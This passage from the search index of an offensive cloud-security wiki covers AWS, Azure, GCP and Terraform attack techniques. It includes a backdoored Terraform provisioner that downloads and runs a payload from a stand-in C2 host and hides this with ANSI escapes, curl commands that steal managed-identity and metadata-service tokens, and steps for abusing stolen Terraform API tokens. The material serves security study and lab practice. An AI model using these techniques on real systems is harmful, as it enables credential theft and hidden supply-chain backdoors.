may be able to persist by abusing user data scripts via two different methods.</p>","title":"User Data Script Persistence"},{"location":"aws/post_exploitation/user_data_script_persistence/#modify-the-user-data-script","text":"<p>Required IAM Permission: modify-instance-attribute Recommended but not required: start-instances, describe-instances, stop-instances (makes things go faster, requires less enumeration. The instance must be stopped to alter the user data)  </p> <p>If we have permission to directly modify the user data scripts, we can potentially persist by adding our own backdoor to it. To do this, we must stop the instance because user data scripts can only be modified when the instance is stopped. You could theoretically wait for this to happen naturally, have a script that constantly tries to modify it, or stop it yourself if you have permissions to do so.</p> <p>The steps to modify user data scripts can be found here.</p>","title":"Modify the User Data Script"},{"location":"aws/post_exploitation/user_data_script_persistence/#modify-a-resource-called-by-the-script","text":"<p>In situations where we cannot modify the user data script itself, we may be able to modify a resource called by the script. Say for example a script is downloaded by an S3 bucket, we may be able to add our backdoor to it.</p>","title":"Modify a Resource Called by the Script"},{"location":"azure/abusing-managed-identities/","text":"<p>Original Research: 0xPwN Blog - Create an Azure Vulnerable Lab: Part #4 \u2013 Managed Identities</p> <p>Using Managed Identities it is possible to grant a resource (such as VM/WebApp/Function/etc) access to other resource (such as Vaults/Storage Accounts/etc.) For example, if we want to give our web application access to a private storage account container without having to deal with how we safely store connection strings in config files or source code, we could use a managed identity.</p> <pre><code>Compute Resource --&gt; Managed Identity --&gt; Assigned Role(s) --&gt; Storage Account --&gt; Container\n</code></pre> <p>A Managed Identity can be a System or User identity. A System identity is bound to the resource, but a User identity is independent.</p>","title":"Abusing Managed Identities"},{"location":"azure/abusing-managed-identities/#setup-azure-managed-identity","text":"<p>First we enable the managed identity for the web application:</p> <p></p> <p>Once enabled, we are given the possibility to configure the roles assigned for this identity (i.e: permissions granted to the service that we enabled the identity for).</p> <p></p> <p>Lastly, we assign one or more roles (which is a set of permissions) for that identity. A role can be assigned at Subscription level, Resource group, Storage Account, Vault or SQL and it propagates \u201cdownwards\u201d in the Azure architecture layer.</p> <p>The default Owner, owning the resource, and Contributor, read/write content of the resource, roles have the most permissions.</p> <p></p> <p>Under each role, we can see in details what permissions are included. Azure allows also to configure custom roles in case the built-in ones are not suitable for your case.</p> <p></p> <p>Similarly, to see who has permissions granted for a give resource, we can check that under the Access Control (IAM) -&gt; View access to this resource.</p> <p></p> <p>So in our case, we should see under the Storage Account that the web application has Reader and Data Access:</p> <p></p>","title":"Setup Azure Managed Identity"},{"location":"azure/abusing-managed-identities/#next-steps","text":"<p>Now that we have the basics of how Managed Identity works, let\u2019s see how can we exploit this. Since the web application has access to the storage account, and we compromised the web application, we should be able to get as well access to the storage account. Long story short, we get the same permissions that the resource we compromised had. Based on how poorly the Identity roles are assigned, it could even be the case that the permissions are assigned at Subscription level, effectively granting us access to all resources inside it!</p> <p></p> <p>While in our case it looks that the permissions are proper (we are limiting access only to the Storage Account that we need access to) and limit the roles to Reader and Data Access (instead of Contributor or Owner), there is still a catch. Our web app needs permissions only to the \u201cimages\u201d container, but the managed identity configured has enough permissions to list the access keys to the whole Storage Account granting us access to any other containers hosted in the same account. </p>","title":"Next steps"},{"location":"azure/abusing-managed-identities/#exploiting-azure-managed-identity","text":"<p>Abusing the command injection on the web app, we can make a curl request to the $IDENTITY_ENDPOINT URL stored in the environment variables and get an access token and account id (client id in the response) which can be used to authenticate to Azure. <pre><code>curl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;api-version=2017-09-01\" -H secret:$IDENTITY_HEADER\n</code></pre> </p> <p>Using the Azure Powershell module, we can connect to Azure with the access token:  <pre><code>PS&gt; Install-Module -Name Az -Repository PSGallery -Force\nPS&gt; Connect-AzAccount -AccessToken &lt;access_token&gt; -AccountId &lt;client_id&gt;\n</code></pre></p> <p>Once connected, you should see details about the Subscription and Tenant that the Managed Identity we are impersonating has access to. Using the Get-AzResource Azure Powershell cmdlet, we can check which resources inside the subscription we can access:</p> <p></p> <p>To list the roles assigned to the managed, we can use the Azure Powershell cmdlet Get-AzRoleAssignment. This cmdlet requires additionally a graph token which we can get from the https://graph.microsoft.com/ endpoint, but also the permission to list roles and permissions for identities which our Identity does not have.</p> <p>However, we can still try to access the Storage Account keys without these permissions and see if we are successful. For that we will use the Get-AzStorageAccountKey cmdlet with the Resource Group Name and Account Name that we found in the previous step.</p> <p>Get storage account keys:</p> <pre><code>&gt;Get-AzStorageAccountKey -ResourceGroupName \"0xpwnlab\" -AccountName \"0xpwnstorageacc\"\n\nKeyName Value                       Permissions CreationTime\n------- -----                       ----------- ----------\nkey1    L175hccq[...]lH9DJ==        Full 3/12/20...\nkey2    vcZiPzJp[...]ZkKvA==        Full 3/12/20...\n</code></pre> <p>http://aka.ms/storage-explorer</p> <p>If the above command returns two keys, than it means that our identity had permissions to list them. Let\u2019s use these keys in Azure Storage Explorer and see if there are other containers stored on the same account. In the Azure Storage Explorer, we click the connect icon and select storage account or service.</p> <p></p> <p>On the second step, this time we select the Account name and key option:</p> <p></p> <p>For the Account name we use the name that we enumerated in the Get-AzResource step, while for the key we can use either of the two we found:</p> <p></p> <p>Once we connect, on the left side menu we should find a new storage account, we see 2 containers: the images container used by the web app, but also another one containing the flag. </p> <p></p> <p>And that\u2019s it! We have just seen how abusing a command injection into a web app, we discovered that it had a managed identity associated to it. After we got the JWT access token, we connected to Azure using the Azure Powershell and enumerated the resources that we have access to. The improper permissions set for the Managed Identity allowed us to read the access key for the whole Storage Account and discover another private container that was not referenced anywhere, containing the flag sensitive information. </p>","title":"Exploiting Azure Managed Identity"},{"location":"azure/anonymous-blob-access/","text":"<p>Original Research: 0xPwN Blog - Create an Azure Vulnerable Lab: Part #1 \u2013 Anonymous Blob Access </p> <p>\"Storage Accounts\" is the service provided by Azure to store data in the cloud. A storage account can used to store:</p> <ul> <li>Blobs</li> <li>File shares</li> <li>Tables</li> <li>Queues</li> <li>VM disks</li> </ul> <p></p> <p>For this tutorial, we will focus on the Blobs section. Blobs are stored within a container, and we can have multiple containers within a storage account. When we create a container, Azure will ask on the permissions that we grant for public access. We can chose between:</p> <ul> <li>Private Access \u2013 no anonymous access is allowed</li> <li>Blob Access \u2013 we can access the blobs anonymously, as long as we know the full URL (container name + blob name)</li> <li>Container Access \u2013 we can access the blobs anonymously, as long we know the container name (directory listing is enabled, and we can see all the files stored inside the container)</li> </ul> <p>As you might have guessed, granting Container Access permission can be easily abused to download all the files stored within the container without any permissions as the only things required to be known are the storage account name and the container name, both of which can be enumerated with wordlists.</p>","title":"Anonymous Blob Access"},{"location":"azure/anonymous-blob-access/#exploiting-anonymous-blob-access","text":"<p>Now, there are thousands of articles explaining how this can be abused and how to search for insecure storage in Azure, but to make things easier I\u2019ll do a TL:DR. One of the easiest way is to use MicroBurst, provide the storage account name to search for, and it\u2019ll check if the containers exists based on a wordlist saved in the Misc/permutations.txt:</p> <pre><code>PS &gt; import-module .\\MicroBurst.psm1\nPS&gt; Invoke-EnumerateAzureBlobs -Base 0xpwnstorageacc\nFound Storage Account - 0xpwnstorageacc.blob.core.windows.net\nFound Container - 0xpwnstorageacc.blob.core.windows.net/public\nPublic File Available: https://0xpwnstorageacc.blob.core.windows.net/public/flag.txt\n</code></pre> <p>Alternatively adding <code>?restype=container&amp;comp=list</code> after the container name: <pre><code>https://&lt;storage_account&gt;.blob.core.windows.net/&lt;container&gt;?restype=container&amp;comp=list\n</code></pre> Output: <pre><code>&lt;EnumerationResults ContainerName=\"https://0xpwnstorageacc.blob.core.windows.net/public\"&gt;\n    &lt;Blobs&gt;\n        &lt;Blob&gt;\n            &lt;Name&gt;flag.txt&lt;/Name&gt;\n            &lt;Url&gt;\nhttps://0xpwnstorageacc.blob.core.windows.net/public/flag.txt\n&lt;/Url&gt;\n            &lt;Properties&gt;\n                &lt;Last-Modified&gt;Sat, 05 Mar 2022 18:02:14 GMT&lt;/Last-Modified&gt;\n                &lt;Etag&gt;0x8D9FED247B7848D&lt;/Etag&gt;\n                &lt;Content-Length&gt;34&lt;/Content-Length&gt;\n                &lt;Content-Type&gt;text/plain&lt;/Content-Type&gt;\n                &lt;Content-Encoding/&gt;\n                &lt;Content-Language/&gt;\n                &lt;Content-MD5&gt;lur6Yvd173x6Zl1HUGvtag==&lt;/Content-MD5&gt;\n                &lt;Cache-Control/&gt;\n                &lt;BlobType&gt;BlockBlob&lt;/BlobType&gt;\n                &lt;LeaseStatus&gt;unlocked&lt;/LeaseStatus&gt;\n            &lt;/Properties&gt;\n        &lt;/Blob&gt;\n    &lt;/Blobs&gt;\n    &lt;NextMarker/&gt;\n&lt;/EnumerationResults&gt;\n</code></pre></p>","title":"Exploiting Anonymous Blob Access"},{"location":"azure/soft-deleted-blobs/","text":"<p>Original Research: 0xPwN Blog - Create an Azure Vulnerable Lab: Part #3 \u2013 Soft Deleted Blobs</p> <p>In this tutorial we will see how data that has been deleted from a private Storage Account Container can still be a risk in some cases. Even if we know the full path of resources uploaded to a private container, Azure requires authentication to be accessed. To provide access we can choose between:</p> <ul> <li>A shared access signature (SAS) \u2013 is a URI that grants restricted access to an Azure Storage container. Use it when you want to grant access to storage account resources for a specific time range without sharing your storage account key.</li> <li>A connection string includes the authorization information required for your application to access data in an Azure Storage account at runtime using Shared Key authorization.</li> <li>Managed Identities</li> </ul> <p>For the sake of this tutorial, we will pretend to be a developer that uses the connection string and saves it in a config file/source code deployed to Azure. Additionally, the web application deployed has a command injection vulnerability.  We can find the connection string of a Storage Account in the Azure portal as shown below:</p> <p></p> <p>Now, the problem here is that we are giving access to the whole storage account by passing the connection string into the web app. Azure supports granular access for specific containers, for a limited amount of time, or event for a specific file within the container! But for convenience (or lack of knowledge), a developer might deploy the connection string for the entire storage account. Don\u2019t be that developer.</p> <p>The second part of this tutorial is about recovering deleted blobs. By default, when creating a storage container using the Portal, the Soft Deletion is enabled with 7 days retention time. Now image that you got access to a storage account with tens of containers, and someone at some point mistakenly uploaded an SSH key to one of these containers and than deleted it without being aware of the 7 day retention day \u201cfeature\u201d. </p> <p></p>","title":"Soft Deleted Blobs"},{"location":"azure/soft-deleted-blobs/#exploiting-soft-deleted-blobs","text":"<p>Now, to exploit this vulnerability we navigate to the web application vulnerable to command injection and start poking around. Listing the files in the current directory, we can find among other the source code in the app.py:</p> <p></p> <p>Listing the contents of this file, we can see there is a connection string stored inside (our placeholder has been replaced at runtime with the actual value of the container):</p> <p></p> <p>Inside the Microsoft Azure Container Explorer, we specify that we want to connect to a storage account</p> <p></p> <p>And that we want to use a Connection String</p> <p></p> <p>And we paste the value of the conn_str variable that we found in the source code, and connect:</p> <p></p> <p>On the left side menu, a new storage account should show up. Navigate to the Blob Containers -&gt; images and open it:</p> <p></p> <p>At first glance, it seems that nothing of interest is stored here. Remember the flag that we accidentally uploaded? Change the view to Active and soft deleted blobs:</p> <p></p> <p>And voila! Right click -&gt; Undelete</p> <p></p>","title":"Exploiting Soft Deleted Blobs"},{"location":"blog/v2_new_look/","text":"<p></p> <p>Nick Frichette \u00b7 @frichette_n \u00b7     December 6, 2021   </p>   <p>Whoa! Things look a little different? You're not imagining it.</p>  <p> </p> The old look.  <p>Hacking The Cloud now uses Material for MkDocs to render the beautiful HTML you see before you.</p>","title":"Hacking The Cloud v2: New Look"},{"location":"blog/v2_new_look/#why-the-change","text":"<p>When Hacking The Cloud was first started in mid-2020, I was primarily focused on getting the project off the ground and wasn't particularly interested in the formatting or appearance. This resulted in the choice to use a familiar technology (Hugo) and finding a freely available theme for it (zDoc).</p> <p>This helped get the project up and running quickly and allowed me to work on getting the first few pages created. Over time, however, small changes were need. Increased font size, changes to the navigation layout, CSS tweaks, etc. Recently more time has been spent making sure things looked okay rather than actually creating content.</p> <p>To be clear, the zDoc theme is excellent, there were just some changes needed that made the theme difficult to use for our purposes. These needs, combined with the appearance that the theme is no longer actively maintained, had caused me to look for something different.</p>","title":"Why the Change?"},{"location":"blog/v2_new_look/#why-material-for-mkdocs","text":"<p>For the past several months I've been looking for a suitable replacement. My list of requirements was high. Additionally, I was looking for something simple, easy to use, and wouldn't have me constantly thinking, \"does this look okay on mobile?\".</p> <p>By pure luck, I found what I was looking for. Kinnaird McQuade happened to retweet an announcement from the Material for MkDocs project, and I was hooked. It looked great, supported Markdown, had admonitions, code blocks, produced static HTML, client-side search, and just about everything else I was looking for. </p> <p>More than that, it's fun and easy to work with.</p> <p>If you'd like to support Material for MkDocs you can join me in sponsoring the project.</p>","title":"Why Material for MkDocs?"},{"location":"blog/v2_new_look/#what-does-this-mean-for-you","text":"<p>Honestly, not a whole lot. Hacking the Cloud will now look a lot better on desktop and mobile. This will free up time and resources to focus on what actually matters, the content.</p> <p>For folks interested in contributing, you are only a pull request away! Our contributing guide has everything you need to get up and running. If you have any questions or ideas feel free to start a conversation on our discussions page.</p>","title":"What Does This Mean for You?"},{"location":"gcp/gcp-buckets/","text":"<p>GCP Buckets are almost 100% identical to AWS S3 Buckets. </p> <p>Theory: This call is based on OpenStack; maybe most cloud environments will be the same.</p> <p>Using @digininja's CloudStorageFinder diff the following files:</p> <p><code>diff bucket_finder.rb google_finder.rb</code></p> <p>The main differences are the URLs:</p> <ul> <li>AWS Supports HTTP and HTTPS</li> <li><code>AWS S3</code> URLs: <code>http://s3-region.amazonaws.com</code>, i.e.: <code>http://s3-eu-west-1.amazonaws.com</code>.</li> <li>GCP Endpoint: <code>https://storage.googleapis.com</code></li> </ul> <p>How to find buckets using CloudStorageFinder:</p> <p>Create a wordlist with any name; in our example, it is <code>wordlist.txt</code>.</p> <p>$ <code>ruby google_finder.rb wordlist.txt</code></p>","title":"Hunting GCP Buckets"},{"location":"gcp/general-knowledge/default-account-names/","text":"<p>Service accounts are similar to Azure Service Principals. They can allow for programmatic access but also abuse. </p> <p>Information on Service Accounts</p> <p>User-Created Service Account: <code>service-account-name@project-id.iam.gserviceaccount.com</code></p> <p>Using the format above, you can denote the following items:</p> <ul> <li><code>service-account-name</code>: This will tell you potentially what services this is for: <code>Bigtable-sa</code> or <code>compute-sa</code></li> <li><code>project-id</code>: This will be the project identifier that the service account is for. You can set your <code>gcloud</code> configuration to this <code>project-id</code>. It will be numerical typically.</li> </ul>","title":"Service Accounts"},{"location":"gcp/general-knowledge/default-account-names/#default-service-account-filename-permutations","text":"<ul> <li><code>serviceaccount.json</code></li> <li><code>service_account.json</code></li> <li><code>sa-private-key.json</code></li> <li><code>service-account-file.json</code></li> </ul>","title":"Default Service Account filename permutations:"},{"location":"gcp/general-knowledge/default-account-names/#application-based-service-account","text":"<ul> <li><code>project-id@appspot.gserviceaccount.com</code>: Ths would be <code>project-id</code> value for App Engine or anything leveraging App Engine.</li> <li><code>project-number-compute@developer.gserviceaccount.com</code>: This service account is for Compute Engine where the <code>project-number-compute</code> will be: <code>project-id</code>-<code>compute</code>. I.E. <code>1234567-compute</code>.</li> </ul>","title":"Application-Based Service Account:"},{"location":"gcp/general-knowledge/default-account-names/#how-to-use-service-accounts","text":"<p>In a BASH (or equivalent) shell: <code>export GOOGLE_APPLICATION_CREDENTIALS=\"/home/user/Downloads/service-account-file.json\"</code></p>","title":"How to use Service Accounts"},{"location":"gcp/general-knowledge/gcp-goat/","text":"<p>GCP-Goat is the vulnerable application for learning the Google Cloud Security</p> <p>The Application consists of the following scenarios</p> <ul> <li>Attacking Compute Engine</li> <li>Attacking Sql Instance</li> <li>Attacking GKE</li> <li>Attacking GCS</li> <li>Privilege Escalation</li> <li>Privilege Escalation in Compute Engine</li> </ul> <p>Project-Link </p>","title":"GCP Goat"},{"location":"gcp/general-knowledge/metadata_in_google_cloud_instances/","text":"<p>Metadata can provide an attacker (or regular user) information about the compromised App Engine instance, such as its project ID, service accounts, and tokens used by those service accounts.  </p> <p>The metadata can be accessed by a regular HTTP GET request or cURL, sans any third-party client libraries by making a request to metadata.google.internal or 169.254.169.254.  </p> <p><pre><code>curl \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&amp;alt=text\" -H\n\"Metadata-Flavor: Google\"\n</code></pre> Note: If you are using your local terminal to attempt access, as opposed to Google's Web Console, you will need to add <code>169.254.169.254    metadata.google.internal</code> to your <code>/etc/hosts</code> file.</p>","title":"Metadata in Google Cloud Instances"},{"location":"gcp/general-knowledge/metadata_in_google_cloud_instances/#metadata-endpoints","text":"<p>For basic enumeration, an attacker can target.  <pre><code>http://169.254.169.254/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/\nhttp://metadata/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/hostname\nhttp://metadata.google.internal/computeMetadata/v1/instance/id\nhttp://metadata.google.internal/computeMetadata/v1/project/project-id\n</code></pre> To view scope: <pre><code>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H \"Metadata-Flavor: Google\"\n</code></pre> To view project metadata: <pre><code>curl \"http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&amp;alt=text\" \\\n    -H \"Metadata-Flavor: Google\"\n</code></pre> To view instance metadata: <pre><code>curl \"http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&amp;alt=text\" \\\n    -H \"Metadata-Flavor: Google\"\n</code></pre></p> <p>The following table is pulled from the Google Cloud Documentation</p>    Metadata Endpoint Description     <code>/computeMetadata/v1/project/numeric-project-id</code> The project number assigned to your project.   <code>/computeMetadata/v1/project/project-id</code> The project ID assigned to your project.   <code>/computeMetadata/v1/instance/zone</code> The zone the instance is running in.   <code>/computeMetadata/v1/instance/service-accounts/default/aliases</code>    <code>/computeMetadata/v1/instance/service-accounts/default/email</code> The default service account email assigned to your project.   <code>/computeMetadata/v1/instance/service-accounts/default/</code> Lists all the default service accounts for your project.   <code>/computeMetadata/v1/instance/service-accounts/default/scopes</code> Lists all the supported scopes for the default service accounts.   <code>/computeMetadata/v1/instance/service-accounts/default/token</code> Returns the auth token that can be used to authenticate your application to other Google Cloud APIs.","title":"Metadata Endpoints"},{"location":"gcp/general-knowledge/security-and-constraints/","text":"<p>GCP Resources are typically placed into Projects. Projects are a mix of resource groups in Azure and Accounts in AWS. Projects can be either non-hierarchical or completely hierarchical. An operator can place security constraints on these projects to provide a baseline security policy. There are also Organization-wide policy constraints that apply to every project.</p>","title":"Security and Constraints"},{"location":"gcp/general-knowledge/security-and-constraints/#examples","text":"<p>From: Organizational Policy Constraints</p> <ul> <li>constraints/iam.disableServiceAccountCreation : This can disable the overall creation of service accounts. Equivalent to Service Principals in Azure.</li> <li>constraints/iam.disableServiceAccountKeyCreation : This constraint will disable the ability to create a service account key. This constraint would be helpful if you want service accounts but only want to use RSA-based authentication. </li> </ul> <p>There are specific policies that are not retroactive. We can use these to our advantage. </p> <ol> <li><code>constraints/compute.requireShieldedVm</code>: If a compute node is already created and exists without this constraint applied, then this constraint will not be retroactive. You must delete the object and re-create it for it to enforce shielded VMs. </li> <li> <p><code>constraints/compute.vmExternalIpAccess</code>: Consider the following scenario:</p> <ul> <li>Constraint is based on the following permutation: <code>projects/PROJECT_ID/zones/ZONE/instances/INSTANCE</code></li> <li>Constraint looks for the <code>name</code> of the machine in the <code>project</code> identifier specified in the specific <code>zone</code></li> <li>If you can boot a VM with this specific set of criteria, then you can have a machine with an External IP Address</li> <li>Machine cannot already exist.</li> <li><code>constraints/compute.vmCanIpForward</code>: Another Non Retroactive Setting. The machine must not exist before this setting is created. Once this is set, then machines will enforce this condition.</li> </ul> </li> </ol>","title":"Examples"},{"location":"terraform/terraform_ansi_escape_evasion/","text":"<p>Original Research: Joern Schneeweisz</p> <p>When performing a Terraform apply from a local workstation, Terraform will output a list of resources it has created, updated, or deleted. Because this is taking place in a terminal, we can potentially use ANSI escape codes to alter this output. This would allow us to hide or obfuscate malicious activity, such as in a malicious Terraform module.</p> <p>Take for example the following Terraform code.</p> main.tf<pre><code>resource \"null_resource\" \"hypothetical_ec2_instance\" {\n}\n\nresource \"null_resource\" \"blah\" {\n  provisioner \"local-exec\" {\n    command = \"wget -q http://evil.c2.domain/payload &amp;&amp; chmod +x payload &amp;&amp; ./payload\"\n  }\n}\n</code></pre> <p>In this example, we are using a local-exec provisioner to run shell commands. If we were to backdoor a module or git repository storing Terraform configurations, and a developer were to download them and run them on their workstation, this would run the shell commands on their workstation.</p>  <p>Tip</p> <p>As an alternative to local-exec, you can also use external_provider.</p>  <p>The problem is that this output would get displayed to the user, for example:</p> <p></p> <p>To solve this, we can use ANSI escape codes to modify this output. It is worth noting that the specific sequences we will need to use will depend on the terminal type the victim is using. The following example is using gnome-terminal on Ubuntu.</p> <pre><code>\\033[2K # Clears the current line\n\\033[A  # Moves the cursor to the previous line\n</code></pre> <p>So, we can modify our payload to the following to hide the malicious activity.</p> main.tf<pre><code>resource \"null_resource\" \"blah\" {\n  provisioner \"local-exec\" {\n    command = \"wget -q http://evil.c2.domain/payload &amp;&amp; chmod +x payload &amp;&amp; ./payload; echo -e '\\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A'\"\n  }\n}\n</code></pre> <p>And this is the output:</p> <p></p>","title":"Terraform ANSI Escape"},{"location":"terraform/terraform_enterprise_metadata_service/","text":"<p>Terraform Enterprise is a self-hosted version of Terraform Cloud, allowing organizations to maintain their own private instance of Terraform. There are many benefits for an enterprise to run this, however, there is also a default configuration that Red Teamers and Penetration Testers can potentially take advantage of.</p> <p>If Terraform Enterprise is deployed to a VM from a cloud provider we may be able to access the instance metadata service and leverage those credentials for further attacks.</p> <p>\"By default, Terraform Enterprise does not prevent Terraform operations from accessing the instance metadata service, which may contain IAM credentials or other sensitive data\" (source)</p>  <p>Note</p> <p>While the focus of this article is on targeting the metadata service, it is worth noting that gaining code execution inside a Terraform run may provide other avenues for attack. For example, environment variables could be leaked which may contain sensitive credentials.</p>","title":"Terraform Enterprise: Attack the Metadata Service"},{"location":"terraform/terraform_enterprise_metadata_service/#remote-code-execution","text":"<p>For many engineers, their first experience with Terraform was locally on their workstations. When they invoked a <code>terraform apply</code> or <code>terraform plan</code> all of that activity took place on the local machine (reaching out to cloud APIs, tracking state, etc.)</p> <p>An exciting feature of Terraform Enterprise (and Cloud) is the idea of Remote Execution, wherein all those operations take place server-side. In Terraform Cloud the execution takes place in \"disposable virtual machines\". In Terraform Enterprise however, it takes place in \"disposable Docker containers\". </p> <p>This introduces an interesting opportunity; If you compromise credentials to initiate a <code>plan</code> or <code>apply</code> operation (or otherwise have access to them. I.E insider threat) we can execute code in a Docker container on the Terraform Enterprise server.</p>  <p>Note</p> <p>It is possible to disable Remote Execution via a configuration however this is discouraged. \"Many of Terraform Cloud's features rely on remote execution, and are not available when using local operations. This includes features like Sentinel policy enforcement, cost estimation, and notifications.\"</p>","title":"Remote (Code) Execution"},{"location":"terraform/terraform_enterprise_metadata_service/#docker-containers-and-metadata-services","text":"<p>Aside from container escapes, running user-supplied code in a container is an interesting opportunity in a cloud context. The specifics will depend upon the cloud provider. For example, in AWS, an attacker could target the Instance Metadata Service. This would provide the attacker IAM credentials for the IAM role associated with the EC2 instance.</p> <p>Other opportunities include things such as the instance user data, which may help enumerate what software is on the host, potentially leak secrets, or reveal what the associated IAM role has access to. It is also possible to use this to pivot to other machines in the VPC/subnet which would otherwise be inaccessible, or to attempt to hit services exposed on localhost on the TFE host (hitting 172.17.0.1).</p>","title":"Docker Containers and Metadata Services"},{"location":"terraform/terraform_enterprise_metadata_service/#attack-prevention","text":"<p>It is worth noting that there are two potential methods to mitigate this attack. The first is the configuration of restrict_worker_metadata_access in the Terraform Enterprise settings. This is not the default, meaning that out of the box Terraform operations have access to the metadata service and its credentials.</p> <p>The second option would depend upon the cloud provider, but options to harden or secure the Metadata Service can also be used. For example, IMDSv2 in an AWS situation would prevent the Docker container from reaching the Metadata Service.</p>  <p>Note</p> <p>Nothing should prevent these two methods from working at the same time. It is a good idea to require IMDSv2 of all EC2 instances in your environment.</p>","title":"Attack Prevention"},{"location":"terraform/terraform_enterprise_metadata_service/#walkthrough","text":"<p>Warning</p> <p>This walkthrough and screenshots are not tested against Terraform Enterprise (this is a free/open source project, we don't have access to a Terraform Enterprise instance for demonstration purposes). As such it is being demoed on Terraform Cloud which, while similar, is not a 1-1 copy. If you are attempting to exploit this against your organization's TFE instance, minor tweaks may be needed. (We are open to Pull Requests!)</p>   <p>Note</p> <p>If you already have a configured and initialized Terraform backend, you can skip to the Executing Code section. The following walkthrough will demonstrate the entire process from finding the token to initializing the backend.</p>","title":"Walkthrough"},{"location":"terraform/terraform_enterprise_metadata_service/#acquire-a-terraform-api-token","text":"<p>To begin, you'll first need to 'acquire' a Terraform API Token. These tokens can be identified by the <code>.atlasv1.</code> substring in them.</p> <p>As for where you would get one, there are a number of possible locations. For example, developer's may have them locally on their workstations in <code>~/.terraform.d/</code>, you may find them in CI/CD pipelines, inappropriately stored in documentation, pull them from a secrets vault, create one with a developer's stolen credentials, etc.</p>","title":"Acquire a Terraform API Token"},{"location":"terraform/terraform_enterprise_metadata_service/#identify-the-organization-and-workspace-names","text":"<p>With access to a valid API token, we now need to find an Organization and Workspace we can use to be nefarious. The good news is that this information is queryable using the token. We can use a tool such as jq to parse and display the JSON.</p> <pre><code>curl -H \"Authorization: Bearer $TFE_TOKEN\" \\\nhttps://&lt;TFE Instance&gt;/api/v2/organizations | jq\n</code></pre>  <p></p>  <p>Next, we need to identify a workspace we can use. Again, this can be quereyed using the organization <code>id</code> we gathered in the previous step.</p> <pre><code>curl -H \"Authorization: Bearer $TFE_TOKEN\" \\\nhttps://&lt;TFE Instance&gt;/api/v2/organizations/&lt;Organization ID&gt;/workspaces | jq\n</code></pre>  <p></p>","title":"Identify the Organization and Workspace Names"},{"location":"terraform/terraform_enterprise_metadata_service/#configure-the-remote-backend","text":"<p>Now that we have the organization and workspace id's from the previous step, we can configure the remote backend. To do this, you can use this example as a template with one exception. We will add a <code>hostname</code> value which is the hostname of the Terraform Enterprise instance. You can store this in a file named <code>backend_config.tf</code>. backend_config.tf<pre><code>terraform {\n  backend \"remote\" {\n    hostname = \"{{TFE_HOSTNAME}}\"\n    organization = \"{{ORGANIZATION_NAME}}\"\n\n    workspaces {\n      name = \"{{WORKSPACE_NAME}}\"\n    }\n  }\n}\n</code></pre></p>","title":"Configure the Remote Backend"},{"location":"terraform/terraform_enterprise_metadata_service/#initialize-the-backend","text":"<p>With the backend configuration file created we can initialize the backend with the following command.</p> <pre><code>terraform init --backend-config=\"token=$TFE_TOKEN\"\n</code></pre> <p>If everything has worked as it should, you should get a <code>Terraform has been successfully initialized</code> notification. To test this, you can perform a <code>terraform state list</code> to list the various state objects.</p>","title":"Initialize the Backend"},{"location":"terraform/terraform_enterprise_metadata_service/#executing-code","text":"<p>Now that our backend has been properly configured and we can access the remote state, we can attempt to execute code. There are several ways this can be done (such as using a local-exec provisioner) however, for our purposes we will be using the External Provider.</p> <p>\"<code>external</code> is a special provider that exists to provide an interface between Terraform and external programs\".</p> <p>What this means is that we can execute code during the Terraform <code>plan</code> or <code>apply</code> operations by specifying a program or script to run.</p> <p>To do this, we will create an <code>external provider</code> in our existing <code>backend_config.tf</code> file (if you already have an existing Terraform project you can add this block to those existing files).</p> backend_config.tf<pre><code>...\n\ndata \"external\" \"external_provider\" {\n    program = [\"python3\", \"wrapper.py\"]\n}\n\noutput \"external_provider_example\" {\n    value = data.external.external_provider\n}\n</code></pre> <p>You may be wondering what the <code>wrapper.py</code> file is. In order to use the <code>external</code> provider, we must \"implement a specific protocol\" (source), which is JSON. To do this, we will wrap the result of the code execution in JSON so it can be returned.</p>  <p>Note</p> <p>The wrapper script is not strictly required if you aren't interested in getting the output. If your goal is simply to execute a C2 payload, you can include the binary in the project directory and then execute it.</p> <p>Wrapping the output in JSON allows us to get the response output.</p>  <p>Our wrapper script looks like the following (feel free to change to your needs).</p> wrapper.py<pre><code>import json\nimport os\n\nstream = os.popen('id')\noutput = stream.read()\nresult = { \"result\" : output }\n\nprint(json.dumps(result))\n</code></pre>","title":"Executing Code"},{"location":"terraform/terraform_enterprise_metadata_service/#terraform-plan","text":"<p>Now that the wrapper script is created (and modified), we can execute code via <code>terraform plan</code>. This is a non-destructive action, which will evaluate our local configuration vs's the remote state. In addition, it will execute our remote provider and return the result to us.</p>  <p></p>   <p>Warning</p> <p>Upon executing <code>terraform plan</code> you may encounter errors for various reasons depending upon the remote state. Those errors will need to be handled on a case by case basis. Typically this involves modifying your <code>.tf</code> files to suit the remote state. This can typically be figured out based on the results of <code>terraform state pull</code>.</p>  <p>From here, we can modify our wrapper script to do a variety of things such as (the purpose of this article) reaching out to the metadata service and pulling those credentials.</p>  <p>Note</p> <p>The results of this run are logged elsewhere. Please do not leak secrets or other sensitive information to parties who do not have a need for the information. A more efficient method would be to use a C2 platform such as Mythic (or even just a TLS encrypted reverse shell) to exfiltrate the credentials.</p>","title":"Terraform Plan"}]}